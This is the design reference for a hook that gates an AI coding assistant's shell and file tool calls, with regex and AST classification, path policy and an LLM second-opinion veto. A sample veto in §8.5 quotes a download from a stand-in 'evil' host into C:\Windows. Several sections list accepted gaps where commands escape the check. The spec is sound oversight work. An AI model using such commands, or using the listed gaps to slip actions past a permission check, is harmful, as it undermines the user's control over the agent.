# PreToolUse Hook — CURRENT DESIGN (Consolidated)

**Consolidated: 2026-08-02** from the 14 dated specs in `docs/superpowers/specs/`
(2026-05-15 → 2026-08-02). **This is the single current-state design reference.**
It reflects all modifications made along the way: design items that were later
changed or dropped are REMOVED here (and listed in §11 so they are not
accidentally resurrected). Detail/resolution of the originals is retained.
When this file and a dated spec disagree, **this file wins**. Source documents
are listed in §12; read them only for history/rationale, never for current truth.

---

## 1. Purpose and pipeline

The hook intercepts AI-assistant tool calls before execution, classifies shell
commands as read-only or modifying, and auto-approves (read-only) or prompts the
user (modifying/unknown). Supported IDEs: **Claude Code, VS Code Copilot,
Codex CLI**. A second-opinion LLM cross-check (§8) can veto local allows.

```
Incoming tool call (JSON on stdin)
  │
  ├─ STEP 0: tool_name filter
  │     ├─ in ignore_tool_name       → [SKIP] log + allow
  │     ├─ NOT in intercept_tool_name → [UNKNOWN] log + ask
  │     └─ in intercept_tool_name     → continue
  ├─ STEP 1: extract command via tool_name_mapping (dot-path into tool_input)
  │     └─ not extractable → ask (fail-safe)
  ├─ STEP 1.5 (path branch): tool in path_tool_mapping?
  │     └─ extract ALL paths (dot-path; [*] walks arrays) → Resolve-PathPolicy
  │        each → worst-case wins; extraction failure → ask.  (Skips STEPS 2-4.)
  ├─ STEP 2: untrusted_pattern (regex on raw command) → match ⇒ ask
  ├─ STEP 3: trusted_pattern   (regex on raw command) → match ⇒ allow
  ├─ STEP 4: classification engine
  │     ├─ 4a domain detection (content-based, $var = strip first)
  │     ├─ 4b decompose into sub-commands (AST for PowerShell, regex otherwise;
  │     │    wrappers unwrapped recursively: ssh, pwsh -Command, Invoke-Command,
  │     │    docker exec, bash -c, sudo, ...)
  │     ├─ 4c redirect analysis (Test-RedirectionTarget → Resolve-PathPolicy;
  │     │    a redirect target is a pseudo sub-result, MatchedPattern=redirection-target)
  │     ├─ 4d per-sub-command resolution (Resolver, §5) → sub-results WITH Tier
  │     ├─ 4e aggregate: any ask ⇒ ask (collect ALL blockers for the reason)
  │     └─ 4f AST-as-arbiter: only when every blocker is the unknown fallback
  │          (no MatchedPattern) → re-parse whole line; conclusive ⇒ allow
  │          (+ tier stamp-back onto untiered sub-results, §6.4)
  ├─ STEP 8b (llm_second_opinion, when enabled): scope gate → LLM call →
  │     attributed merge (§8); may force ask, never downgrades an ask
  └─ Always: log (daily .log + .records.jsonl per IDE) → stdout decision JSON
```

**Exit-code contract:** stdout JSON carries the decision; exit code only signals
hook health. `0` = a decision was produced (allow AND ask); `2` = fatal,
no-decision failures only (empty stdin, unparseable JSON, missing tool_name/
tool_input, config load error). (Claude Code treats exit 2 as a hook error and
ignores the JSON — an ask must exit 0 or it never prompts.)

**Fail-closed invariants:** unknown command → ask. Unparseable anything
(config, JSON, LLM output) → ask or fatal, never silent allow. Config regex
that doesn't compile → Load-Config throws → exit 2 (the hook blocks ALL tool
calls — including the edit that would repair the config; validate live config
edits with `Load-Config` immediately).

---

## 2. Modules (src/, flat, dot-sourced via $PSScriptRoot)

| File | Responsibility |
|---|---|
| `Hook.ps1` | Entry: stdin JSON → detect IDE → load config → Invoke-Classify → Invoke-LlmReview (STEP 8b, when enabled) → log → stdout. Conditional hard cap: `timeout_ms + 2000` when LLM enabled, else 3000ms (500ms soft warning). Config path override: `PRETOOLHOOK_CONFIG_PATH` env (production default = repo config.json). |
| `HookAdapter.ps1` | IDE detection, command/path extraction (dot-path walker `Get-InputFieldValues` + `Resolve-FieldPathLeaves` with `[*]` array enumeration, leaves streamed), output shaping per IDE, `ask`→`deny` mapping for Codex. |
| `ConfigLoader.ps1` | Load + validate + compile config: pattern arrays → regex (auto-anchor `^`; glob `*`→`.*` only after a non-special char), `system_paths`/`editable_paths` → one anchored alternation each, CWD capture (`_cwd`, `_cwdNorm`), per-domain `_parameterCommandLookup`, `trusted_programs`, `safe_expressions` allowlists, `llm_second_opinion` compiled block (optional; absent ⇒ `$null`). Legacy-key guards throw fail-closed (e.g. old `modifying_strictness` top-level key). |
| `Parser.ps1` | Domain detection; decomposition (AST + regex); wrapper/nested extraction (`Find-NestedCommands` with value-taking-flag table); subshell splitting; `Test-RedirectionTarget`; `Resolve-PathPolicy`; `Test-EditableOrCwd`; canonicalization (`ConvertTo-CanonicalWritePath`: relative→CWD anchor, `..` collapse, `\\?\` strip, separator unify, `~` home). |
| `Resolver.ps1` | `Resolve-Command` per sub-command (step order in §5.1); `New-ResolutionResult` (Decision/Reason/MatchedPattern/Risk/Tier); `Get-EffectiveStrictness`; `Test-TrustedProgram` + `Test-StatementContainsModifying`; parameter_commands evaluator + the two parameter parsers (AST for PowerShell, shell tokenizer otherwise). |
| `Classifier.ps1` | Pipeline orchestration; `Test-TrustedUntrusted`; AST-as-arbiter (`Invoke-PowerShellArbitration`, `Resolve-AsArbiter`, `Merge-WorstTier`); path branch (STEP 1.5); aggregation + reasons (pipeline chains). |
| `LlmReview.ps1` | `Test-LlmReviewScope`, `Get-LlmReviewVerdict` (+`ConvertTo-LlmVerdict` layered parser), `Invoke-LlmReview` (scope→verdict→merge→log), `Test-GatedInvocationSafe` (stage-2 guard) + `Split-GuardTokens`. |
| `Logger.ps1` | Daily `yyyy-MM-dd.<ide>.log` (text) + `yyyy-MM-dd.<ide>.records.jsonl` (full raw input + structured fields incl. `llm`); `Format-LlmLogBlock` shared reconciliation formatter; per-IDE suffix (claude/copilot/codex). Log dir: `log_file_path` or `~/.pretoolhook/`. |
| `TestRunner.ps1` | XML-driven runner (`-XmlPath`, `-Filter`, `-Strictness`, `-Cwd`, `-ConfigPath`). |
| `Run-AllTests.ps1` | One-shot differential over every live suite (auto-discovers; KnownFails baselines; REGRESSION/OK/IMPROVED; `-Filter`, `-ShowOutput`). ASCII-only output (powershell.exe 5.1 mangles UTF-8 em-dashes into smart quotes). |

---

## 3. IDE support

### 3.1 Detection (`Detect-IDE`)

Decisive signals fire first, then majority vote:

| # | Signal | Claude Code | Copilot | Codex CLI |
|---|--------|-------------|---------|-----------|
| 5 | `turn_id` present | — | — | **decisive → Codex** |
| 6 | `model` present | — | — | **decisive → Codex** |
| 1 | `hook_event_name` | `PreToolUse` | `preToolUse` | `PreToolUse` |
| 2 | `tool_use_id` | present | absent | present |
| 3 | `timestamp` | ISO 8601 ms | epoch/simple | ISO 8601 |
| 4 | `transcript_path` | `.claude` | `copilot-chat` | — |

Vote ties → `ClaudeCode` (most restrictive format).

### 3.2 Output

Internal decisions are `allow`/`ask`; only the boundary translates:

| IDE | allow | ask | Wrapper |
|---|---|---|---|
| Claude Code | `allow` | `ask` | `hookSpecificOutput` |
| Copilot | `allow` | `ask` | `permissionDecision` (+Reason) |
| Codex CLI | `allow` | **`deny`** | `hookSpecificOutput` |

Codex parses `ask` but errors on it (hook marked failed, call proceeds) — hence
the mapping. A forced ask from the LLM feature maps the same way.

---

## 4. config.json schema (current)

```jsonc
{
  "version": "1.0",
  "log_file_path": "",                     // empty ⇒ ~/.pretoolhook/
  "global_modifying_strictness": "normal", // strict | normal | loose (legacy key "modifying_strictness" is REJECTED fail-closed)

  "trusted_pattern":   [ /* regex on WHOLE command → allow immediately (STEP 3). Exception-only; normally near-empty. */ ],
  "untrusted_pattern": [ /* regex on WHOLE command → ask immediately (STEP 2). Checked first. */ ],

  "intercept_tool_name": [ "Bash", "PowerShell", "run_in_terminal", ... ],
  "ignore_tool_name":    [ /* read_file, Agent, ExitPlanMode, NotebookEdit, TaskStop, ScheduleWakeup, ... */ ],
  "tool_name_mapping":   { "Bash": "tool_input.command", ... },   // dot-path strings
  "path_tool_mapping":   {                                        // file tools → PATHS, not commands
    "Write": "tool_input.file_path", "Edit": "tool_input.file_path",
    "multi_replace_string_in_file": "tool_input.replacements[*].filePath",  // [*] = one leaf per array element
    "create_file": "tool_input.filePath", "create_directory": "tool_input.dirPath", ...
  },

  "system_paths":   { "linux": ["/etc/", ...], "windows": ["C:\\\\Windows", ...] },  // ALWAYS ask (win = regex, quadruple \\ in JSON; linux = escaped literal)
  "editable_paths": { "linux": [...], "windows": [...] },   // BOTH raw regex; opt-in: empty ⇒ disabled. CWD subtree is ALWAYS editable, every mode.

  "trusted_programs": [ /* script paths (path-suffix / basename, case+separator-insensitive).
      A statement whose first token is a trusted program allows IFF no sub-span of the
      statement (incl. arguments) resolves to a KNOWN modifying/ask decision. */ ],

  "safe_expressions": {
    "dotnet_method_allowlist":        [ /* name-only, INSTANCE calls only ($obj.Name(...), incl. intrinsic .Where/.ForEach) */ ],
    "dotnet_static_method_allowlist": [ /* type-qualified 'Type::Method' for STATIC [Type]::Method calls; matched vs type as written + reflected full name */ ]
  },

  "commands": {
    "<Domain>": {                          // DOS_CMD, PowerShell, Linux, Git, Terraform, Docker, Kubernetes, AWS_CLI
      "modifying_strictness": "normal",    // optional per-domain; consulted ONLY when global == "normal"
      "read_only":        [ { "name": "...", "patterns": ["..."], "description": "..." } ],
      "strictness_gated": [ { "name": "...", "patterns": ["..."], "risk": "low", "description": "..." } ],
      "modifying":        [ { "name": "...", "patterns": ["..."], "risk": "high", "description": "..." } ],
      "read_only_verbs":  ["Get-*", ...],  // PowerShell only; two-word entries before single-word prefixes
      "modifying_verbs":  { "high": [...], "medium": [...], "low": [...] },   // PS verbs / AWS prefixes
      "parameter_commands": {               // classified SOLELY by these rules (runs before tier arrays)
        "curl": {
          "aliases": ["..."],
          "rules": [ { "param": ["-d","--data"], "match": "present", "decision": "modifying", "risk": "medium" },
                     { "param": "-X", "match": "values", "values": ["GET","HEAD"], "decision": "read-only" } ],
          "default": "read-only"           // used when the declared param is ABSENT (all modes)
        }
      }
    }
  },

  "llm_second_opinion": { /* §8.9 — optional block; absent = feature off, zero overhead */ }
}
```

**Strictness semantics:**

| Mode | Meaning |
|---|---|
| `strict` | `strictness_gated` matches **ask**; AWS flag-strip disabled; parameter_commands unrecognized values ask. Forces ALL domains. |
| `normal` | `strictness_gated` matches **allow**; per-domain `modifying_strictness` takes effect; path policy: non-system/non-editable writes ask ONLY when `editable_paths` non-empty (else allow). |
| `loose` | gated allows everywhere; parameter_commands unrecognized values use `default`; path policy allows anything non-system. Forces ALL domains. |

`Get-EffectiveStrictness(Config, Domain)`: global ≠ normal ⇒ global; else the
domain's own value; else normal. Reach (L4): the gated tier + AWS flag-strip +
parameter_commands use effective strictness; **path policy stays global**.
`system_paths` always asks in every mode, winning over CWD/editable/loose.

**Path policy ladder** (`Resolve-PathPolicy`, shared by redirects and the path
branch — byte-identical decisions): empty → ask → canonicalize → temp raw forms
(`/tmp/`, `%TEMP%`, `$env:TEMP`) allow(low) → system (canonical) ask(high) →
CWD/editable allow(low) → loose allow → normal-without-editable allow →
default **ask(medium)**.

---

## 5. Classification engine

### 5.1 `Resolve-Command` step order

```
0   domain normalize
0b  $var = strip (domain-agnostic, recursive; re-detects domain)
0c  sudo strip (linux/dos)
0d  git -C / global-option strip
0e  AWS flag strip (effective strictness == normal; only if ≥2 tokens remain —
    else keep original so explicit entries like `aws --version` match).
    A token starting with '(' is NEVER consumed as a flag value (2026-08-02:
    `(aws ...` after --request-id is a subexpression, not a value).
0f  full-path strip (C:\...\git.exe → git) · trusted_programs check
7   parameter_commands (modifying rules → read-only rules → default;
    unrecognized VALUE: strict/normal ask, loose default; ABSENT param: default always)
1a  read_only pattern arrays            → allow, Tier=read_only
1a.5 strictness_gated pattern arrays    → strict: ask(Tier=strictness_gated); else allow(Tier=strictness_gated)
1b  modifying pattern arrays            → ask, Tier=modifying
2   verb/prefix tiers (PS two-word → one-word; AWS prefixes; risk-tiered)
2.5 shell flow keywords
3   fallback ask, MatchedPattern='', Tier='' — with precise-wording variants:
    static .NET call not on allowlist; aws parsed service+verb matching no
    prefix ⇒ "unregistered AWS verb"; PowerShell Verb-Noun matching no verb
    tier ⇒ "unregistered PowerShell verb"; docker/kubectl/terraform/git first
    token recognized but subcommand unlisted ⇒ "<tool> subcommand 'X' not
    registered" (≤3 leading global flags skipped). All still fail-closed ask;
    generic "unknown command" remains for linux/dos_cmd (catch-all domain).
```

Within a tier, first match wins (config array order). Patterns are start-anchored
"starts-with" regexes. Every match branch records **`Tier`** on the sub-result
(`read_only` | `strictness_gated` | `modifying` | `''` for unknown/safe-expression).

### 5.2 Decomposition rules (Parser)

- **PowerShell domain**: real AST (`Language.Parser::ParseInput`). `CommandAst`s
  are emitted; ScriptBlockAst bodies are recursed into (so
  `Invoke-Command -ScriptBlock { git add . }` emits BOTH the wrapper and the
  inner command). Call-operator `& { ... }` / `. { ... }` wrapper is SKIPPED
  (inner commands already found by the recursion). String constants count as
  commands only when top-level + separator/newline + word-pair, or when they
  start with a known command prefix. Parse failure → regex fallback.
- **Other domains**: split on `; && || |` (quote- AND paren-aware; pipes split
  in EVERY domain since 2026-08-02 — an aws_cli pipeline was previously
  classified as one segment, hiding the tail command). Per-segment domain
  re-detection; `$()`/`${}` subshells extracted recursively.
- **Paren-group extraction** (regex domains, 2026-08-02): top-level
  unquoted `( … )` groups whose contents are command-shaped (map to a known
  domain via Get-CommandDomain, or contain a top-level operator) are extracted
  as their own sub-commands — closing the hole where a modifying command
  hidden in a PowerShell-style subexpression flag value
  (`--request-id (aws … ).Prop`) was silently allowed. Data groups
  (`(status.phase=Running)`, bare words, quoted parens) are NOT extracted;
  one nested level; PowerShell segments are covered by the AST walk instead.
  Residual: a bare linux-domain group with no operator (`(rm -rf /tmp/x)`)
  is still not extracted (extracting it would over-ask on data parens).
- **Wrappers** (`ssh host '...'`, `pwsh|powershell[.exe] [flags] -Command/-c/
  -ScriptBlock`, `Invoke-Command ... -ScriptBlock { }`, `bash -c`, `docker exec`,
  `sudo`, `kubectl exec`) are unwrapped; the regex `Find-NestedCommands` has the
  full value-taking-flag table (`ssh -W/-i/-o` consume the next token).
  `pwsh -File script.ps1` is deliberately NOT unwrapped (opaque content) → ask.
- **Zero-command PowerShell lines** (pure expressions): `Get-PowerShellSafeExpressions`
  certifies every statement via `Test-SafeAst`; all safe ⇒ one synthetic
  `'(safe expression)'` sub-command which resolves allow immediately.

### 5.3 Redirection (`Test-RedirectionTarget`)

fd redirects (`2>&1`) and here-strings → allow, no filesystem effect.
`>` / `>>` → target through `Resolve-PathPolicy` (§4 ladder). The redirect
result is a pseudo sub-result (`MatchedPattern="redirection-target"`), excluded
from LLM numbering/scope counts. Known limitation (H5, accepted): `%SystemRoot%`/
`$env:` forms are not expanded and canonicalize as CWD-relative (the LLM stage-2
guard refuses to suppress those shapes — §8.7).

### 5.4 Path branch (file tools)

Tools in `path_tool_mapping` never reach command classification: every mapped
path (all of them for `[*]` array payloads) goes through `Resolve-PathPolicy`;
worst-case wins; extraction failure or empty list → ask (fail-safe, no content
heuristics). `edit_files`/`apply_patch` payloads embed paths in patch *text*
(not JSON fields) and still need bespoke extraction (flagged; today they fall
back to generic handling).

### 5.5 AST-as-arbiter + safe expressions

**Activation:** final decision ask AND every blocker has no `MatchedPattern`
(unknown fallback only — known modifying and redirect blockers bypass it).
**Arbitration:** re-parse the whole line; every `CommandAst` must resolve ALLOW
(directly, or as a wrapper whose inner commands all allow —
`Resolve-AsArbiter` returns the resolved **tier**, worst-tier-wins across inner
commands via `Merge-WorstTier`: `strictness_gated` > `read_only` > `''`); then
every statement must pass `Test-SafeAst` (commands pre-approved via the allowed
set). Conclusive ⇒ allow, reason `read-only (PowerShell AST arbitration)`, and
the arbiter-resolved tiers are **stamped back** onto still-untiered sub-results
(G5 fix — so the LLM merge sees the wrapper's true tier, §8.6).
Not conclusive ⇒ the original ask stands, unchanged.

**`Test-SafeAst` certification table:**

| Node | Safe when |
|---|---|
| AssignmentStatementAst | LHS is a variable (or index/array of one) AND RHS safe (a property SET like `[Console]::Title='x'` is a side effect ⇒ unsafe) |
| Hashtable/ArrayLiteral/Paren/Array/SubExpression | all children safe |
| StatementBlockAst / ScriptBlockAst / ScriptBlockExpressionAst | all body statements safe (recursive; covers `-replace` operator scriptblocks) |
| String/ExpandableString (nested safe), Variable, Constant, Type | always |
| MemberExpressionAst (property READ) | target safe |
| InvokeMemberExpressionAst | target safe AND args safe AND (instance call: name ∈ `dotnet_method_allowlist`) OR (static `[Type]::Method`: qualified name ∈ `dotnet_static_method_allowlist`) |
| ConvertExpressionAst (casts) | child safe |
| Binary/UnaryExpressionAst | operands safe |
| CommandAst | its extent text ∈ allowedCommands |
| FileRedirectionAst | **never** (redirects belong to Test-RedirectionTarget) |
| anything else | unsafe |

---

## 6. Strictness-gated tier (current state)

- `strictness_gated` is the middle tier: allow in normal/loose, ask in strict
  (per-domain override possible via `commands.<Domain>.modifying_strictness`,
  consulted only when global is normal; no per-domain strictness ships by
  default, so default behavior = normal everywhere).
- Entries carry `risk` — reported when they prompt in strict.
- The gated tier is the user's **accepted-risk bucket**: phase II/III of the
  LLM feature build directly on it (§8).
- Note: `git rev-parse` lives in `read_only` (user ruling 2026-08-02 — it is
  read-only; an earlier migration had it gated).

---

## 7. Logging and audit

- Daily files per IDE under `log_file_path` (default `~/.pretoolhook/`):
  `yyyy-MM-dd.<ide>.log` (human) and `yyyy-MM-dd.<ide>.records.jsonl`
  (machine: `{ received_at, raw, ... , llm? }`).
- `.log` entry: timestamp, IDE, tool, decision, elapsed; reason; the exact
  command in `[[[ ]]]` markers; `[SKIP]`/`[UNKNOWN_TOOL]` forms for the STEP 0
  outcomes; LLM reconciliation block when a check happened (§8.8).

---

## 8. LLM second opinion (`llm_second_opinion`)

Phases I–III merged into the current design. Purpose: a second pair of eyes —
for in-scope command blocks, an LLM (OpenAI-compatible local gateway)
independently classifies the block; the local merge **suppresses** flags that
land on the user's accepted-risk tier and **vetoes** everything else. The LLM
can escalate to ask but **never downgrades** a local ask (injection-safe by
construction).

### 8.1 Scope gate (`Test-LlmReviewScope`)

Applies only to full-pipeline command results (D8). Out of scope: skipped/
unknown tools, empty `Command`, empty `SubResults` (fast-path trusted/untrusted
gate hits and path-branch results have no SubResults — **trusted_pattern allows
never reach the LLM; accepted bypass, user ruling 2026-08-02**), and the
`redirection-target` pseudo-entry is excluded from the count.

| Level | In scope |
|---|---|
| `all` | every full-pipeline result |
| `complex_commands` | real sub-command count ≥ `complex_min_subcommands` (default 2) |
| `complex_remote` | complex AND ≥1 `remote_indicators` regex matches any sub-command text **or the full original command text** (wrappers survive only in the original text — that's how `Invoke-Command.*-ComputerName` works) |

Default remote indicators: aws, kubectl, helm, terraform, ssh/scp/sftp, docker,
curl/wget, Invoke-RestMethod/irm, Invoke-WebRequest/iwr, Enter-PSSession,
New-PSSession, `Invoke-Command.*-ComputerName`. **Git is local.**

### 8.2 Call shape

`POST {base_uri}/v1/chat/completions`: `model`, `messages` (system+user),
`temperature` (0.0), `max_tokens` (16), `seed: 0`; `Authorization: Bearer` only
when `api_key` non-empty; timeout `Ceiling(timeout_ms/1000)s`. The **full
original command text** (≤8000 chars) plus (attributed mode) the numbered
sub-command list are sent. Mock env `PRETOOLHOOK_LLMREVIEW_MOCK` short-circuits
before any HTTP: `modifying|read-only|garbage|down|idx:|idx:2|idx:1,2|idx:0`
(`idx:*` routes attributed JSON through the REAL parser; unknown values throw).

### 8.3 Prompts (model-agnostic; definitions unchanged since phase I)

System message carries rules + few-shot + output contract; user message is only
`<command_block>…</command_block>` + (v2) `<sub_commands>1. … 2. …</sub_commands>`.
V1 contract: one bare token `true`/`false`. V2 contract (when
`attributed_verdicts: true` AND a numbered list exists):

```text
{"modifying": []}        - every numbered sub-command is read-only
{"modifying": [2]}       - sub-command 2 is modifying
{"modifying": [1, 2]}    - several are modifying
Use index 0 for anything modifying that is NOT in the numbered list
(for example a redirect target or an unlisted nested command).
No reasoning. No markdown. Emit the JSON immediately.
```

The numbered list is EXACTLY the scope's sub-commands (P2) — same array feeds
prompt and lookup, so mismatch is impossible by construction. The POC script
(`C:\git\cc\deepseek-tester\api-gateway-caller.ps1`) mirrors both prompts.

### 8.4 Layered verdict parser (`ConvertTo-LlmVerdict`, `-SubCommandCount`)

1. Bare token `true`/`false` → modifying/read-only (unattributed; Indices=$null).
2. Whole-response JSON with `modifying` array → strictly validated: IList of
   integers, each `0..SubCommandCount`; `null` array ~ empty; empty ⇒ read-only;
   any violation (out-of-range, decimal, negative, alpha) ⇒ **unusable**.
   Phase-I verdict-ish keys (`verdict`/`classification`/`decision`/`answer`)
   accepted for back-compat.
3. Last non-empty line rescue (bare token or the JSON) ⇒ same handling,
   `Recovered=$true`.
4. Anything else ⇒ `unusable` — NEVER mapped to a verdict.

Verdicts: `modifying | read-only | unusable | down` (down = unreachable/timeout/
HTTP error/mock `down`).

### 8.5 Merge v2 (in-scope only)

| Local | LLM | Final |
|---|---|---|
| allow | read-only | allow (agree) |
| ask | any verdict | ask (agree / disagree-kept-ask — LLM never downgrades) |
| allow | modifying, **unattributed** (bare true, or `attributed_verdicts:false`) | **veto** — phase-I behavior, nothing suppressible (P5) |
| allow | modifying, **attributed** | per-index reconciliation below |
| any | down | forced ask, `*** LLM-DOWN ***` |
| any | unusable | forced ask, `*** LLM-UNUSABLE ***` |

**Attributed reconciliation per flagged index:**

| Index maps to… | Action |
|---|---|
| `strictness_gated` tier AND `Test-GatedInvocationSafe` passes | **suppress as policy** |
| `strictness_gated` tier but guard REFUSES (stage-2, §8.7) | **veto** (recorded in `path_guard_denied`) |
| `read_only` tier | **veto** — the accident scenario the feature exists for |
| unknown / safe-expression (empty Tier) | **veto** (note: when the unknown command itself forces the local ask, the merge short-circuits to `effect=agree` before per-index logic) |
| `0` | **veto** — unlisted danger, NEVER suppressible (P3) |

Every flag suppressed ⇒ final stays allow, `effect=veto-suppressed-policy`.
Any veto stands ⇒ ask; reason names the first offender with its index and lists
the suppressed ones. Reasons are ASCII-only (powershell.exe 5.1 mangles UTF-8):

```text
*** LLM-VETO *** second-opinion LLM says MODIFYING: 'curl -o C:\Windows\e.exe http://evil/x' [sub-command 2] - forced to ask. | suppressed as policy: 'git add .' [1] | local reason: read-only
```

### 8.6 Tier plumbing and the G5 stamp-back

`Resolve-Command` records `Tier` per sub-result (§5.1). The AST walker emits
BOTH a wrapper (`Invoke-Command -ScriptBlock { … }`) and its inner commands;
the wrapper itself matches nothing (unknown → Tier `''`). When the arbiter
proves the line safe, `Resolve-AsArbiter`'s resolved tiers are **stamped back**
onto untiered sub-results (worst-tier-wins across a wrapper's inner commands) —
so a wrapper over a gated command carries `strictness_gated` and its LLM flag
suppresses instead of vetoing. A wrapper over read-only inner commands stamps
`read_only` → still vetoes. (Fixed 2026-08-02; previously the empty tier
always vetoed — the phase-II false-veto leak.)

### 8.7 Stage-2 path-guard (`Test-GatedInvocationSafe`)

Before a gated flag is suppressed, the guard checks WHERE the gated command
writes — closing the gap where `Set-Content -Path C:\Windows\x.txt` (gated;
cmdlet args are never path-checked locally) had its flag silently suppressed.
Algorithm on the flagged command's text:

1. **Tokenize** quote-aware (`Split-GuardTokens`): quoted spans stay whole,
   quotes stripped — `"C:\Windows\my file.txt"` cannot smuggle through.
2. **Skip-list** (`printf`, `setx`): arguments are data, never targets → safe.
3. **Path scan**: every drive-absolute / UNC / POSIX-absolute token →
   `Resolve-PathPolicy` (same ladder as redirects — system always denies;
   temp/CWD/editable pass; foreign paths deny only when they'd ask locally);
   any `ask` ⇒ **deny**. Relative paths not scanned (CWD-relative).
4. **Fail-closed variable rule**: a KNOWN WRITER (name-list of content/out-file/
   export/item cmdlets + aliases + `mkdir`/`move`/`ren`/`ln`/`unzip`) with an
   unresolved `$var`/`%VAR%` argument AND no literal path token ⇒ **deny**
   (`%TEMP%`/`%TMP%`/`$env:TEMP`/`$env:TMP` excepted — H5 class). A literal safe
   path + variable elsewhere (`Set-Content C:\temp\a.txt $content`) stays quiet.

Accepted residuals (spec §5): source-vs-destination not distinguished
(`Copy-Item` FROM a system dir vetoes — conservative noise, user-approved);
writer with a literal SAFE path plus a variable TARGET slips; POSIX system
paths canonicalize to drive form on Windows (pre-existing engine behavior);
lone single-command blocks never reach the LLM at `complex_*` levels.

### 8.8 Reconciliation logging (user requirement)

Shared formatter `Format-LlmLogBlock` (Logger.ps1) — identical output in
production `.log` and in the fixture runner's per-run log
(`c:\temp\pretoolhook-llm-review-testlogs\llm-review-run-<ts>.log`):

```text
  LLM-SENT      : [ 2 subcommand ] | model=deepseek-v4-flash timeout=30000ms | [1] git add . | [2] curl -o … (each ≤120 chars)
  LLM-RECV      : '{"modifying":[1,2]}' (4820ms, recovered=false) -> verdict=modifying indices=[1,2]
  LLM-LOCAL     : decision=allow (read-only); tiers: [1]=strictness_gated [2]=read_only
  LLM-RECONCILE : flagged=[1,2] suppressed=[1](strictness_gated) veto=[2] path-guard denied: [2] -> FINAL: ask
```

(The `[ N subcommand ]` prefix — also present on the out-of-scope one-liner
`LLM: [ N subcommand ] | in_scope=False …` — records how many sub-commands
the engine produced, so `complex_min_subcommands` threshold tuning is auditable
from the log alone. `path-guard denied:` appears only when the stage-2 guard
refused a gated flag; `(mock)` marks injected verdicts.) Out-of-scope keeps the phase-I one-liner;
disabled logs nothing. JSONL `llm` object: `enabled, level, in_scope,
sub_command_count, remote_match, sent, tiers, local_decision, local_reason,
timeout_ms, verdict, recovered, latency_ms, indices, mocked, error,
raw_excerpt, flagged, suppressed, path_guard_denied, effect, model`.

### 8.9 Config block and validation

```jsonc
"llm_second_opinion": {
  "enabled": true,                        // master switch; block absent or false ⇒ complete no-op
  "level": "complex_remote",              // all | complex_commands | complex_remote (bad value ⇒ Load-Config throws)
  "base_uri": "http://127.0.0.1:3030",
  "model": "deepseek-v4-flash",           // required non-empty when enabled
  "api_key": "",
  "timeout_ms": 30000,                    // >0; hard cap becomes timeout_ms+2000 when enabled
  "temperature": 0.0,                     // 0.0-2.0
  "max_tokens": 64, // >1; attributed JSON answers are longer than a bare token
  "complex_min_subcommands": 2,           // int >= 1
  "attributed_verdicts": true,            // bool; false = phase-I binary contract end-to-end (per-model fallback)
  "json_mode": false,                     // bool (2026-08-03): response_format json_object on ATTRIBUTED calls
                                          // (hard fix for models that answer with prose -> unusable); gateway-dependent
  "remote_indicators": [ /* optional; compiled list replaces the 8.1 default */ ]
}
```

The V2 system prompt was hardened 2026-08-03 after BOTH glm-5.2 and
deepseek-v4-flash ignored the contract on simple commands and answered with
analysis prose (`Let me analyze these sub-commands...`) -> unusable ->
fail-closed ask. Hardening: the OUTPUT CONTRACT block moved to the end
(recency), a first-character rule (`'{'` only, also repeated as a user-message
suffix after the command block), and one NEGATIVE EXAMPLE marked wrong.
Combined with `json_mode: true` (API-level JSON constraint) this is the
compliance lever; the live runner exposes `-JsonMode` / `-LegacyPrompt` for
A/B comparison of plain vs hardened vs hardened+JSON.

Optional-block pattern: absent => skip silently; present => validate everything
even when disabled (bad values surface immediately); invalid => throw fail-closed.

### 8.10 Error handling and posture

| Failure | Behavior |
|---|---|
| gateway unreachable / timeout / HTTP error | `down` → forced ask (`*** LLM-DOWN ***`, tells the user how to disable) |
| 200 but unparseable / invalid indices | `unusable` → forced ask (`*** LLM-UNUSABLE ***`, raw excerpt ≤120 chars) |
| config validation error | Load-Config throws → exit 2 (fatal path) |
| disabled / block absent | zero overhead beyond a `$null` check |

Posture: false vetoes cost a prompt (safe; the disagreement stats in JSONL
expose the rate); prompt injection can only suppress a veto, never create an
allow the local engine didn't produce; index `0` cannot be suppressed. A model
that can't honor the attributed contract flips `attributed_verdicts` to `false`
(decided per model by the opt-in live suite).

---

## 9. Testing architecture

**Rules:** tests NEVER use the live root `config.json` — every suite runs
against a fixture config beside its test file. Tests never call a live LLM
(mock env or local mock server only; the live suite is opt-in, user-run, ~2k
tokens). The ~1000-case core suites are never extended for new features — new
features get isolated fixtures.

**Core suites** (`test/config/live/`, run via `src/Run-AllTests.ps1`, fixture
copy of the root config synced on demand by `Sync-Fixtures.ps1`, which REFUSES
to sync while the root has the LLM enabled or non-normal strictness):
`test-cases.xml` (742), `test-cases.strictness-gated.normal.xml` (48),
`test-cases.strictness-gated.strict.xml` (49), `test-cases.trustedpattern.xml`
(74, `-Cwd` pinned), `test-cases.redirect-strict.xml` (25, `-ConfigPath
config.strict.json`), `test-fullpipe.xml` (24, spawns the real Hook.ps1).
Plus `test-cases.codex.ps1` (17 unit tests: Detect-IDE + Format-Output).
Current totals: **Run-AllTests 962/962, sandbox 938/938, codex 17/17.**

**Sandbox** (`test/config/test-strictness-gate/`, `Run-Tests.ps1`): the all-gated
reference config + suites (normal/strict/trustedpattern/redirect-strict);
kept deliberately divergent from live.

**LLM fixture** (`test/config/llm-review/`): own config (gated Git add/commit,
Set-Content, Copy-Item, printf, mkdir; minimal `system_paths` — required or the
compiled regex matches nothing). Runner `Run-Tests.ps1 -XmlPath`:
- `test-cases.p2.small.xml` (default): 24 checks = 10 cases + 14 pre-flights
  (2 config-rejection + 12 parser units).
- `test-cases.p2.large.xml`: 78 checks = 64 cases in 7 groups (suppression
  matrix, levels, fallback/malformed, effects/log/reason, scope/numbering,
  attributed-off regression, G7 stage-2 path-guard).
- `test-cases.xml` (phase I): 32 checks, regression.
- `http/Run-LlmCallTests.ps1`: 27 checks against a local HttpListener mock
  server — proves the real HTTP path incl. a spawned Hook.ps1 (zero quota).
- `http/Run-LlmLiveTests.ps1`: **opt-in, real gateway, ~2k tokens**; the
  `Live-Attr-*` cases measure a model's index compliance and decide production
  `attributed_verdicts` per model.

Every fixture runner writes per-run reconciliation logs to
`c:\temp\pretoolhook-llm-review-testlogs\llm-review-run-<ts>.log` via
`Format-LlmLogBlock` (same shape as production `.log`).

**TDD conventions:** RED proof names the exact expected failures; byte-identical
differential for engine changes; probes/scratch under `temp/` (untracked);
user scratch files (`config - Copy*.json`, `debug/`) stay untracked.

---

## 10. Agent command guidelines (R1–R7, prevention-only)

